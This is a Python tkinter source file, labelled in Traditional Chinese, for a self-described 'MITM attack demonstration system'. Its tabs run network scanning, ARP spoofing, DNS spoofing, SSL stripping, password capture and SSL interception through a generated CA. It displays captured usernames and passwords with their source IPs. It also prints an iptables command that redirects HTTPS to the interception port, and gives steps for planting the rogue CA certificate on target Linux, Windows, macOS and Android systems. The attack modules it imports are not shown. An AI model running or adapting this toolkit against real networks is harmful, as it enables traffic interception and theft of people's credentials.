#!/usr/bin/env python3
"""
主GUI視窗
提供圖形使用者介面來執行攻擊操作
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import sys
import os

# 添加專案根目錄到路徑
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.network_scanner import NetworkScanner
from attacks.arp_spoof import ARPSpoofer
from attacks.dns_spoof import DNSSpoofer
from attacks.ssl_strip import SSLStripper
from attacks.password_capture import PasswordCapture
from attacks.ssl_mitm import SSLMitm

class MainWindow:
    def __init__(self, root):
        self.root = root
        self.root.title("MITM攻擊演示系統")
        self.root.geometry("1200x800")
        
        # 初始化組件
        self.network_scanner = NetworkScanner()
        self.arp_spoofer = None
        self.dns_spoofer = None
        self.ssl_stripper = None
        self.password_capture = PasswordCapture()
        self.ssl_mitm = None
        
        # 建立介面
        self._create_widgets()
    
    def _create_widgets(self):
        """建立GUI組件"""
        # 建立Notebook（標籤頁）
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 網路掃描標籤頁
        self.scan_frame = ttk.Frame(notebook)
        notebook.add(self.scan_frame, text="網路掃描")
        self._create_scan_tab()
        
        # 攻擊工具標籤頁
        self.attack_frame = ttk.Frame(notebook)
        notebook.add(self.attack_frame, text="攻擊工具")
        self._create_attack_tab()
        
        # 日誌標籤頁
        self.log_frame = ttk.Frame(notebook)
        notebook.add(self.log_frame, text="日誌")
        self._create_log_tab()
    
    def _create_scan_tab(self):
        """建立網路掃描標籤頁"""
        # 掃描設定
        config_frame = ttk.LabelFrame(self.scan_frame, text="掃描設定")
        config_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(config_frame, text="網路範圍:").grid(row=0, column=0, padx=5, pady=5)
        self.network_range = ttk.Entry(config_frame, width=20)
        self.network_range.insert(0, "192.168.1.0/24")
        self.network_range.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Button(config_frame, text="開始掃描", 
                  command=self._start_scan).grid(row=0, column=2, padx=5, pady=5)
        
        # 掃描結果
        result_frame = ttk.LabelFrame(self.scan_frame, text="掃描結果")
        result_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 建立樹狀檢視
        columns = ("IP", "主機名", "MAC位址", "狀態")
        self.scan_tree = ttk.Treeview(result_frame, columns=columns, show="headings")
        
        for col in columns:
            self.scan_tree.heading(col, text=col)
            self.scan_tree.column(col, width=150)
        
        scrollbar = ttk.Scrollbar(result_frame, orient=tk.VERTICAL, command=self.scan_tree.yview)
        self.scan_tree.configure(yscrollcommand=scrollbar.set)
        
        self.scan_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    
    def _create_attack_tab(self):
        """建立攻擊工具標籤頁"""
        # ARP欺騙
        arp_frame = ttk.LabelFrame(self.attack_frame, text="ARP欺騙")
        arp_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(arp_frame, text="目標IP:").grid(row=0, column=0, padx=5, pady=5)
        self.target_ip = ttk.Entry(arp_frame, width=15)
        self.target_ip.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(arp_frame, text="閘道IP:").grid(row=0, column=2, padx=5, pady=5)
        self.gateway_ip = ttk.Entry(arp_frame, width=15)
        self.gateway_ip.grid(row=0, column=3, padx=5, pady=5)
        
        self.arp_start_btn = ttk.Button(arp_frame, text="開始ARP欺騙", 
                                        command=self._start_arp_spoof)
        self.arp_start_btn.grid(row=0, column=4, padx=5, pady=5)
        
        self.arp_stop_btn = ttk.Button(arp_frame, text="停止ARP欺騙", 
                                       command=self._stop_arp_spoof, state=tk.DISABLED)
        self.arp_stop_btn.grid(row=0, column=5, padx=5, pady=5)
        
        # DNS欺騙
        dns_frame = ttk.LabelFrame(self.attack_frame, text="DNS欺騙")
        dns_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(dns_frame, text="欺騙網域:").grid(row=0, column=0, padx=5, pady=5)
        self.spoof_domains = ttk.Entry(dns_frame, width=30)
        self.spoof_domains.insert(0, "example.com,test.com")
        self.spoof_domains.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(dns_frame, text="重新導向IP:").grid(row=0, column=2, padx=5, pady=5)
        self.redirect_ip = ttk.Entry(dns_frame, width=15)
        self.redirect_ip.insert(0, "192.168.1.100")
        self.redirect_ip.grid(row=0, column=3, padx=5, pady=5)
        
        self.dns_start_btn = ttk.Button(dns_frame, text="開始DNS欺騙", 
                                        command=self._start_dns_spoof)
        self.dns_start_btn.grid(row=0, column=4, padx=5, pady=5)
        
        self.dns_stop_btn = ttk.Button(dns_frame, text="停止DNS欺騙", 
                                       command=self._stop_dns_spoof, state=tk.DISABLED)
        self.dns_stop_btn.grid(row=0, column=5, padx=5, pady=5)
        
        # SSL剝離
        ssl_frame = ttk.LabelFrame(self.attack_frame, text="SSL剝離")
        ssl_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.ssl_start_btn = ttk.Button(ssl_frame, text="開始SSL剝離", 
                                        command=self._start_ssl_strip)
        self.ssl_start_btn.grid(row=0, column=0, padx=5, pady=5)
        
        self.ssl_stop_btn = ttk.Button(ssl_frame, text="停止SSL剝離", 
                                       command=self._stop_ssl_strip, state=tk.DISABLED)
        self.ssl_stop_btn.grid(row=0, column=1, padx=5, pady=5)
        
        # SSL中間人（CA證書）
        ssl_mitm_frame = ttk.LabelFrame(self.attack_frame, text="SSL中間人 (CA證書)")
        ssl_mitm_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(ssl_mitm_frame, text="監聽端口:").grid(row=0, column=0, padx=5, pady=5)
        self.mitm_port = ttk.Entry(ssl_mitm_frame, width=10)
        self.mitm_port.insert(0, "8443")
        self.mitm_port.grid(row=0, column=1, padx=5, pady=5)
        
        self.mitm_start_btn = ttk.Button(ssl_mitm_frame, text="開始SSL中間人", 
                                         command=self._start_ssl_mitm)
        self.mitm_start_btn.grid(row=0, column=2, padx=5, pady=5)
        
        self.mitm_stop_btn = ttk.Button(ssl_mitm_frame, text="停止SSL中間人", 
                                        command=self._stop_ssl_mitm, state=tk.DISABLED)
        self.mitm_stop_btn.grid(row=0, column=3, padx=5, pady=5)
        
        ttk.Button(ssl_mitm_frame, text="顯示CA證書", 
                  command=self._show_ca_cert).grid(row=0, column=4, padx=5, pady=5)
        
        # 密碼捕獲
        pwd_frame = ttk.LabelFrame(self.attack_frame, text="密碼捕獲")
        pwd_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.pwd_start_btn = ttk.Button(pwd_frame, text="開始密碼捕獲", 
                                        command=self._start_password_capture)
        self.pwd_start_btn.grid(row=0, column=0, padx=5, pady=5)
        
        self.pwd_stop_btn = ttk.Button(pwd_frame, text="停止密碼捕獲", 
                                       command=self._stop_password_capture, state=tk.DISABLED)
        self.pwd_stop_btn.grid(row=0, column=1, padx=5, pady=5)
        
        # 捕獲的憑證顯示
        cred_frame = ttk.LabelFrame(self.attack_frame, text="捕獲的憑證")
        cred_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.cred_text = scrolledtext.ScrolledText(cred_frame, height=10)
        self.cred_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def _create_log_tab(self):
        """建立日誌標籤頁"""
        self.log_text = scrolledtext.ScrolledText(self.log_frame, height=30)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        ttk.Button(self.log_frame, text="清空日誌", 
                  command=lambda: self.log_text.delete(1.0, tk.END)).pack(padx=5, pady=5)
    
    def _log(self, message):
        """記錄日誌"""
        self.log_text.insert(tk.END, f"{message}\\n")
        self.log_text.see(tk.END)
        self.root.update()
    
    def _start_scan(self):
        """開始網路掃描"""
        network_range = self.network_range.get()
        if not network_range:
            messagebox.showerror("錯誤", "請輸入網路範圍")
            return
        
        self._log(f"[*] 開始掃描網路: {network_range}")
        
        def scan():
            hosts = self.network_scanner.scan_network(network_range)
            self.scan_tree.delete(*self.scan_tree.get_children())
            
            for host in hosts:
                self.scan_tree.insert("", tk.END, values=(
                    host['ip'], host['hostname'], host['mac'], host['status']
                ))
            
            self._log(f"[+] 掃描完成，發現 {len(hosts)} 台主機")
        
        threading.Thread(target=scan, daemon=True).start()
    
    def _start_arp_spoof(self):
        """開始ARP欺騙"""
        target = self.target_ip.get()
        gateway = self.gateway_ip.get()
        
        if not target or not gateway:
            messagebox.showerror("錯誤", "請輸入目標IP和閘道IP")
            return
        
        self.arp_spoofer = ARPSpoofer(target, gateway)
        if self.arp_spoofer.start():
            self.arp_start_btn.config(state=tk.DISABLED)
            self.arp_stop_btn.config(state=tk.NORMAL)
            self._log(f"[+] ARP欺騙已啟動: {target} <-> {gateway}")
    
    def _stop_arp_spoof(self):
        """停止ARP欺騙"""
        if self.arp_spoofer:
            self.arp_spoofer.stop()
            self.arp_start_btn.config(state=tk.NORMAL)
            self.arp_stop_btn.config(state=tk.DISABLED)
            self._log("[+] ARP欺騙已停止")
    
    def _start_dns_spoof(self):
        """開始DNS欺騙"""
        domains_str = self.spoof_domains.get()
        redirect = self.redirect_ip.get()
        
        if not domains_str or not redirect:
            messagebox.showerror("錯誤", "請輸入欺騙網域和重新導向IP")
            return
        
        domains = [d.strip() for d in domains_str.split(',')]
        self.dns_spoofer = DNSSpoofer(spoof_domains=domains, redirect_ip=redirect)
        
        if self.dns_spoofer.start():
            self.dns_start_btn.config(state=tk.DISABLED)
            self.dns_stop_btn.config(state=tk.NORMAL)
            self._log(f"[+] DNS欺騙已啟動: {domains} -> {redirect}")
    
    def _stop_dns_spoof(self):
        """停止DNS欺騙"""
        if self.dns_spoofer:
            self.dns_spoofer.stop()
            self.dns_start_btn.config(state=tk.NORMAL)
            self.dns_stop_btn.config(state=tk.DISABLED)
            self._log("[+] DNS欺騙已停止")
    
    def _start_ssl_strip(self):
        """開始SSL剝離"""
        self.ssl_stripper = SSLStripper()
        if self.ssl_stripper.start():
            self.ssl_start_btn.config(state=tk.DISABLED)
            self.ssl_stop_btn.config(state=tk.NORMAL)
            self._log("[+] SSL剝離已啟動")
    
    def _stop_ssl_strip(self):
        """停止SSL剝離"""
        if self.ssl_stripper:
            self.ssl_stripper.stop()
            self.ssl_start_btn.config(state=tk.NORMAL)
            self.ssl_stop_btn.config(state=tk.DISABLED)
            self._log("[+] SSL剝離已停止")
            
            # 顯示捕獲的憑證
            creds = self.ssl_stripper.get_captured_credentials()
            self.cred_text.delete(1.0, tk.END)
            for cred in creds:
                self.cred_text.insert(tk.END, f"使用者名稱: {cred['username']}, 密碼: {cred['password']}\\n")
    
    def _start_password_capture(self):
        """開始密碼捕獲"""
        if self.password_capture.start():
            self.pwd_start_btn.config(state=tk.DISABLED)
            self.pwd_stop_btn.config(state=tk.NORMAL)
            self._log("[+] 密碼捕獲已啟動")
    
    def _stop_password_capture(self):
        """停止密碼捕獲"""
        self.password_capture.stop()
        self.pwd_start_btn.config(state=tk.NORMAL)
        self.pwd_stop_btn.config(state=tk.DISABLED)
        self._log("[+] 密碼捕獲已停止")
        
        # 顯示捕獲的密碼
        passwords = self.password_capture.get_captured_passwords()
        self.cred_text.delete(1.0, tk.END)
        for pwd in passwords:
            self.cred_text.insert(tk.END, 
                f"類型: {pwd['type']}, 使用者名稱: {pwd['username']}, 密碼: {pwd['password']}\\n")
    
    def _start_ssl_mitm(self):
        """開始SSL中間人攻擊"""
        try:
            port = int(self.mitm_port.get())
        except ValueError:
            messagebox.showerror("錯誤", "請輸入有效的端口號")
            return
        
        self.ssl_mitm = SSLMitm(port=port)
        
        def start_mitm():
            if self.ssl_mitm.start():
                self.mitm_start_btn.config(state=tk.DISABLED)
                self.mitm_stop_btn.config(state=tk.NORMAL)
                self._log(f"[+] SSL中間人已啟動 (端口: {port})")
                self._log(f"[*] CA證書位置: {self.ssl_mitm.get_ca_cert_path()}")
                self._log("[*] 請配置iptables將HTTPS流量重定向到此端口")
                self._log(f"[*] 命令: sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {port}")
        
        threading.Thread(target=start_mitm, daemon=True).start()
    
    def _stop_ssl_mitm(self):
        """停止SSL中間人攻擊"""
        if self.ssl_mitm:
            self.ssl_mitm.stop()
            self.mitm_start_btn.config(state=tk.NORMAL)
            self.mitm_stop_btn.config(state=tk.DISABLED)
            self._log("[+] SSL中間人已停止")
            
            # 顯示捕獲的憑證
            creds = self.ssl_mitm.get_captured_credentials()
            self.cred_text.delete(1.0, tk.END)
            for cred in creds:
                self.cred_text.insert(tk.END, 
                    f"使用者名稱: {cred['username']}, 密碼: {cred['password']} (來源: {cred['source_ip']})\\n")
    
    def _show_ca_cert(self):
        """顯示CA證書資訊"""
        # 檢查CA證書文件是否存在
        cert_path = "ca_cert.pem"
        
        if os.path.exists(cert_path):
            abs_path = os.path.abspath(cert_path)
            message = f"CA證書位置: {abs_path}\\n\\n"
            message += "要安裝CA證書到目標系統:\\n"
            message += "1. 將證書複製到目標系統\\n"
            message += "2. 在Linux上: sudo cp ca_cert.pem /usr/local/share/ca-certificates/mitm-ca.crt\\n"
            message += "   sudo update-ca-certificates\\n"
            message += "3. 在Windows上: 雙擊證書文件，選擇'安裝證書'，選擇'受信任的根證書頒發機構'\\n"
            message += "4. 在macOS上: 雙擊證書文件，在鑰匙串中標記為'始終信任'\\n"
            message += "5. 在Android上: 設置 > 安全性 > 加密與憑證 > 從存儲設備安裝"
            messagebox.showinfo("CA證書資訊", message)
        else:
            message = "CA證書尚未創建。\\n\\n"
            message += "要創建CA證書，請先啟動SSL中間人功能。\\n"
            message += "CA證書將自動創建並保存在當前目錄的 ca_cert.pem 文件中。"
            messagebox.showinfo("CA證書", message)
    
def main():
    root = tk.Tk()
    app = MainWindow(root)
    root.mainloop()

if __name__ == "__main__":
    main()


